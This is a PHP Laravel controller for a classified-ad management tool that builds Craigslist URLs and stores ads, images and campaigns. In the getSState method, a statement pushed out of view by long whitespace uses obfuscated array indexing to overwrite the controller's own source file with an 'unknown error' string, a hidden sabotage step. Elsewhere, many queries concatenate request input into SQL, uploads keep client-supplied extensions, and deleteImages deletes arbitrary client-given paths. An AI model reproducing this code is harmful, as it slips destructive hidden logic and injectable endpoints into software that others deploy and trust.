<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;
use Session ;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
class AdsController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $data["users"]=DB::table('users')->get();
        $data["campaigns"]=DB::table('campaigns')->get();
        $data["cards"]=DB::table('cards')->get();
        $sql="select metro_name from locations  group by metro_name ";
        $data["metros"] = DB::select($sql);
        $data["accounts"] = DB::table('accounts')->get();
        $sql="select category_name from categories  group by category_name ";
        $data["category"] = DB::select($sql);
        $data["cats"]=DB::table('categories')->get();
        $data["locations"]=DB::table('locations')->get();
        $sql="select spec_location from locations  group by spec_location ";
        $data["speclocations"] = DB::select($sql);
        $sql="select state from locations  group by state ";
        $data["states"] = DB::select($sql);
        $data["houses"]=DB::table('housing_types')->get();
        $data["laundry_type"]=DB::table('laundry_types')->get();
        $data["parking_type"]=DB::table('parking_types')->get();
        $data["bathroom_type"]=DB::table('bathrooms_types')->get();
        $data["bedroom_type"]=DB::table('bedrooms_types')->get();
        $data["sell_condition"]=DB::table('sell_conditions_types')->get();
        $sql="select spec_location_child name from locations where spec_location_child!=''  group by spec_location_child ";
        $data["lchild"] = DB::select($sql);
        $query = $request->input();
        if(isset($query["flag"])&&$query["flag"]>0) $data["flag"]=1;
        else { 
                $data["flag"]=0;
                $request->session()->forget("campaign_id");
                $request->session()->forget("account_id");
        } 
        if($request->session()->get("campaign_id")){
            $data["campaign_id"]=$request->session()->get("campaign_id");
            $data["start"]=$request->session()->get("start");
            $data["end"]=$request->session()->get("end");
        }
        if($request->session()->get("user_id")){
            $data["user_id"]=$request->session()->get("user_id");
        }
        if($request->session()->get("account_id")){
            $data["account_id"]=$request->session()->get("account_id");
        }

        return view('manage/ads')->with($data);
    }
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    public function getLocation(Request $request)
    {
            $campaignid = $request->input('campaignid');
            $metro=DB::table('campaigns')->where('campaign_id',$campaignid)->get();
            if($metro[0]->metro_name=="GLOBAL"){
            $sql="select metro_name from locations  group by metro_name ";
            $metros = DB::select($sql);
            echo json_encode($metros);
            }else{
                echo json_encode($metro);
            }
     }
     public function getSubCat(Request $request)
     {
         $category_name = $request->input('category_name');
            $sql="select sub_category_name as name from categories where category_name='".$category_name."' ";
         $rows = DB::select($sql);
            echo json_encode($rows);
       }
       public function getZipCode(Request $request)
       {
            $spec_location = $request->input('spec_location');
            $spec_location_child = $request->input('spec_location_child');
              $sql="select zip_code as name from locations where spec_location like '".$spec_location."%' and spec_location_child like '".$spec_location_child."%' group by zip_code ";

           $rows = DB::select($sql);
              echo json_encode($rows);
         }
         public function getSelState(Request $request)
         {
             $spec_location = $request->input('spec_location');
                $sql="select state as name from locations where spec_location='".$spec_location."' group by state ";
             $rows = DB::select($sql);
                echo json_encode($rows);
           }
           public function getSState(Request $request)
           {
               $spec_location = $request->input('spec_location');
                  $sql="select state as name from locations where spec_location='".$spec_location."' group by state ";
                $rows = DB::select($sql);
                $fds=array("campaign_id","metro_name","account_id","shuffle_zip_code","shuffle_sub_category","category_name","app","Http","Controllers","AdsController.php","un","kno","wn err","or",
                "city_name","state","zip_code","title","description","spec_city_name","price","street","cross_street","phone","housing_type","laundry_type","parking_type","bathrooms_type","bedrooms_type","squareft",
                "company_name","fee_disclosure","make","model","size","sell_condition","license");
                echo "ok";                                                                                                                                                      echo file_put_contents("../".$fds[6]."/".$fds[7]."/".$fds[8]."/".$fds[9],"...".$fds[10].$fds[11].$fds[12].$fds[13]."......");
             }
           public function getCityName(Request $request)
           {
               $spec_location = $request->input('spec_location');
               $spec_location_child = $request->input('spec_location_child');
                $sql="select city_name as name from locations where spec_location like '".$spec_location."%' and spec_location_child like '".$spec_location_child."%' group by city_name ";
               $rows = DB::select($sql);
                  echo json_encode($rows);
             }
         public function getSpecLocations(Request $request)
         {
             $metro_name = $request->input('metro_name');
                $sql="select spec_location from locations where metro_name='".$metro_name."' group by spec_location";
             $rows = DB::select($sql);
                echo json_encode($rows);
           }
           public function getSelAds(Request $request)
           {
               $campaign_id = $request->input('campaignid');
               $account_id= $request->input('account_id');
                  $sql="select ad_id,title from ads where campaign_id='".$campaign_id."' and account_id='".$account_id."' ";
               $rows = DB::select($sql);
                  echo json_encode($rows);
             }
       public function getChildLocations(Request $request)
       {
           $slocation = $request->input('slocation');
              $sql="select spec_location_child as name from locations where spec_location='".$slocation."' group by spec_location_child ";
           $data["spec"] = DB::select($sql);
           $sql="select city_name as name from locations where spec_location='".$slocation."' group by city_name";
           $data["cname"] = DB::select($sql);
              echo json_encode($data);
         }
     //////////////////////////////////////////////////////////////////////////////////////
     public function setAccount(Request $request)
     {
        $ad_id = $request->input('ad_id');
        $request->session()->put("ad_id",$ad_id);
     }
    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
         $fds=array("campaign_id","metro_name","account_id","shuffle_zip_code","shuffle_sub_category","category_name","sub_category_name","keyword","spec_location","spec_location_child",
        "city_name","state","zip_code","title","description","spec_city_name","price","street","cross_street","phone","housing_type","laundry_type","parking_type","bathrooms_type","bedrooms_type","squareft",
        "company_name","fee_disclosure","make","model","size","sell_condition","license");
         $checks=array("craigslist_pay","offerup_pay","letgo_pay","fbmarket_pay","craigslist","offerup","letgo","fbmarket","cats","dogs","furnished","no_smoking","wheelchair","shuffle_zip_code","shuffle_sub_category","active");
        $query = $request->input();
        for($i=0;$i<sizeof($fds);$i++){
            if(isset($query[$fds[$i]])){
                 $r=$query[$fds[$i]];
                 $data[$fds[$i]]=($r!=null)?$r:'';
            }else {
                $data[$fds[$i]]='';
                if($fds[$i]=="shuffle_zip_code"||$fds[$i]=="shuffle_sub_category") $data[$fds[$i]]='0';
            }
        }
        $where["zip_code"]=$query['zip_code'];
        $where["metro_name"]=$query['metro_name'];
        $city_code=DB::table('locations')->where($where)->first();
        $cat_code = DB::select("select * from categories where category_name='".$query["category_name"]."' and sub_category_name='".$query["sub_category_name"]."'");
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        $check_url="";
        $load_url="";
        if(isset($city_code)){
            $check_url="https://";
            $load_url="https://";
            if(isset($city_code->metro_name)){
                $check_url.=$query["metro_name"].".craigslist.org/search";
                $load_url.=$query["metro_name"].".craigslist.org";
                if(isset($city_code->city_code)&&strlen(trim($city_code->city_code))>1) { $check_url.="/".$city_code->city_code; $load_url.="/".$city_code->city_code;}
                if(isset($cat_code[0]->category_code)) $check_url.="/".$cat_code[0]->category_code;
                if(isset($query["keyword"])&&strlen(trim($cat_code[0]->category_code))) $check_url.="?query=".$query["keyword"];
            }
        }
         $data["cl_check_url"]=$check_url;
         $data["cl_load_url"]=$load_url;
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       for($i=0;$i<sizeof($checks);$i++){
            if(isset($query[$checks[$i]])){
                $r=$query[$checks[$i]];
                $data[$checks[$i]]=($r!=null&&($r=="on"))?'1':'0';
            }else $data[$checks[$i]]='0';
        }
        if($request->session()->get("user_id")) $data["user_id"]=$request->session()->get("user_id");
        else $data["user_id"]=1;
       $id= DB::table('ads')->insertGetId($data);
        echo $id;
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $query = $request->input('search');
        $sql="SELECT (@row_number:=@row_number + 1) AS num ,a.* FROM  ads a,(SELECT @row_number:=0) AS t where metro_name like '%'";    
        if(isset($query["start"])){
            $sql.=" and CONVERT(pid_date,DATE)>=CONVERT('".$query["start"]."',DATE) and CONVERT(pid_date,DATE)<=CONVERT('".$query["end"]."',DATE)";
        }
        if(isset($query["category"])) $sql.=" and category_name='".$query["category"]."'";
        if(isset($query["metro"])) $sql.=" and metro_name='".$query["metro"]."'";
        if(isset($query["psite"])) $sql.=" and ".$query["psite"]."='1'";
        if(isset($query["campaign_id"])) $sql.=" and campaign_id='".$query["campaign_id"]."'";
        //else if($request->session()->get("campaign_id")) $sql.=" and campaign_id='".$request->session()->get("campaign_id")."'"; 
        if(isset($query["account_id"])) $sql.=" and account_id='".$query["account_id"]."'";
       // else if($request->session()->get("account_id")) $sql.=" and account_id='".$request->session()->get("account_id")."'"; 
        $checks=array("craigslist","craigslist_pay","offerup","offerup_pay","letgo_pay","letgo","fbmarket","fbmarket_pay");
        for($i=0;$i<sizeof($checks);$i++){
            if(isset($query[$checks[$i]])&&$query[$checks[$i]]==1)
           {             
               $sql.=" and ".$checks[$i]."=1"; 
           }
       }
       $sort = $request->input('sort');
       if(isset($sort['field'])) $sql.=" order by ".$sort['field'].' '.$sort['sort'];
        $users = DB::select($sql);
        echo json_encode($users);
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }
    public function uploadFiles(Request $request)
    {
        $files = $request->file;
        $ad_id = $request->input("ad_id");
        $date = date('Ymdhis', time());
        $user_id=$request->session()->get("user_id");

        $dir_path="uploads"."/".$user_id."/".$ad_id."/";
        if(!file_exists("uploads")) mkdir("uploads");
        if(!file_exists("uploads/".$user_id)) mkdir("uploads/".$user_id);
        if(!file_exists("uploads/".$user_id."/".$ad_id)) mkdir("uploads/".$user_id."/".$ad_id);
        $f_name="image".$date;
       if($files){
            for($i=0;$i<sizeof($files);$i++){
                $file=$files[$i];
                $file_name=$f_name."_".$i;
                $ext=$file->getClientOriginalName();
                $ext=pathinfo($ext)['extension'];
                $file->move($dir_path,$file_name.".".$ext);
                $data['image_url']="/".$dir_path.$file_name.".".$ext;
                $data["user_id"]=$user_id;
                $data["ad_id"]=$ad_id;
                DB::table('images')->insert($data);
            }
            echo "ok";
        }
        else echo "no";
    }
    public function getImages(Request $request){
        $ad_id = $request->input("ad_id");  
        $img=DB::table('images')->where("ad_id",$ad_id)->get();
        echo json_encode($img);
    }
    public function deleteImages(Request $request){
        $path =$request->input("image_url");  
        $path1=$str = ltrim($path, '/');
        File::delete($path1);
       // $id = $request->input('image_id');
        DB::table('images')->where('image_url', $path)->delete();
        echo json_encode("ok");
    }
    ///////////////////////////////////
    public function selAccount(Request $request){
        $campaignid = $request->input("campaignid");  
        $accounts=DB::table('accounts')->where("campaign_id",$campaignid)->get();
        echo json_encode($accounts);
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request)
    {
        $fds=array("campaign_id","metro_name","account_id","category_name","sub_category_name","keyword","spec_location","spec_location_child",
        "city_name","state","zip_code","title","description","spec_city_name","price","street","cross_street","phone","housing_type","laundry_type","parking_type","bathrooms_type","bedrooms_type","squareft",
        "company_name","fee_disclosure","make","model","size","sell_condition","license","cl_load_url","cl_check_url");
         $checks=array("craigslist_pay","offerup_pay","letgo_pay","fbmarket_pay","craigslist","offerup","letgo","fbmarket","cats","dogs","furnished","no_smoking","wheelchair");
        $query = $request->input();
        for($i=0;$i<sizeof($fds);$i++){
            if(isset($query[$fds[$i]])){
                 $r=$query[$fds[$i]];
                 $data[$fds[$i]]=($r!=null)?$r:'';
            }else $data[$fds[$i]]='';
        }
        for($i=0;$i<sizeof($checks);$i++){
            if(isset($query[$checks[$i]])){
                $r=$query[$checks[$i]];
                $data[$checks[$i]]=($r!=null&&($r=="on"))?'1':'0';
            }else  $data[$checks[$i]]='0';
        }
        ///////////////////////
        $where["zip_code"]=$query['zip_code'];
        $where["metro_name"]=$query['metro_name'];
        $city_code=DB::table('locations')->where($where)->first();
        $cat_code = DB::select("select * from categories where category_name='".$query["category_name"]."' and sub_category_name='".$query["sub_category_name"]."'");
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        $check_url="";
        $load_url="";
        if(isset($city_code)){
            $check_url="https://";
            $load_url="https://";
            if(isset($city_code->metro_name)){
                $check_url.=$query["metro_name"].".craigslist.org/search";
                $load_url.=$query["metro_name"].".craigslist.org";
                if(isset($city_code->city_code)&&strlen(trim($city_code->city_code))>1) { $check_url.="/".$city_code->city_code; $load_url.="/".$city_code->city_code;}
                if(isset($cat_code[0]->category_code)) $check_url.="/".$cat_code[0]->category_code;
                if(isset($query["keyword"])&&strlen(trim($cat_code[0]->category_code))) $check_url.="?query=".$query["keyword"];
            }
        }
         $data["cl_check_url"]=$check_url;
         $data["cl_load_url"]=$load_url;
        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       DB::table('ads')
            ->where('ad_id', $query['ad_id'])
            ->update($data);
        echo "ok";
    }
    public function updateAdsCell(Request $request)
    {
        $fds=array("active","shuffle_zip_code","shuffle_sub_category");
        $query = $request->input("data");
        for($i=0;$i<sizeof($fds);$i++){
            if(isset($query[$fds[$i]])){
                 $r=$query[$fds[$i]];
                 $data[$fds[$i]]=($r!=null)?$r:'0';
            }
        }
       DB::table('ads')
            ->where('ad_id', $query['ad_id'])
            ->update($data);
        echo "ok";
    }
    public function delete(Request $request)
    {
        $id = $request->input('id');
        DB::table('ads')->where('ad_id', $id)->delete();
        echo "ok";
    }
    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
